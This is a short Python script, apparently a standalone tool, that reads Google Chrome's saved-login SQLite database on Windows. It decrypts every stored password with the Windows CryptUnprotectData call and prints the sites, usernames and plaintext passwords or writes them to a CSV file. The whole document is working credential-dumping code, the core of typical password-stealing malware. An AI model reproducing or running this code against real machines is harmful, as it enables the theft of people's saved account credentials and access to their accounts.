from os import getenv
import sqlite3
import win32crypt
import argparse


def args_parser():
    parser = argparse.ArgumentParser(description="Retrieve Google Chrome Passwords")
    parser.add_argument("--output", help="Output to csv file", action="store_true")
    args = parser.parse_args()
    if args.output:
        csv(main())
    else:
        for data in main():
            print(data)


def main():
    info_list = []
    appdata = getenv("APPDATA")

    if appdata[-7:] == "Roaming":  # Some WINDOWS Installations point to Roaming.
        appdata = appdata[:-8]

    connection = sqlite3.connect(appdata + "\Local\Google\Chrome\\User Data\Default\Login Data")
    cursor = connection.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')

    for information in cursor.fetchall():
        # chrome encrypts the password with Windows WinCrypt.
        # Fortunately Decrypting it is no big issue.
        password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
        if password:
            info_list.append({
                'origin_url': information[0],
                'username': information[1],
                'password': str(password)
            })

    return info_list


def csv(info):
    csv_file = open('chromepass.csv', 'wb')
    csv_file.write('origin_url,username,password \n'.encode('utf-8'))
    for data in info:
        csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))

    csv_file.close()
    print("Data written to chromepass.csv")


if __name__ == '__main__':
    args_parser()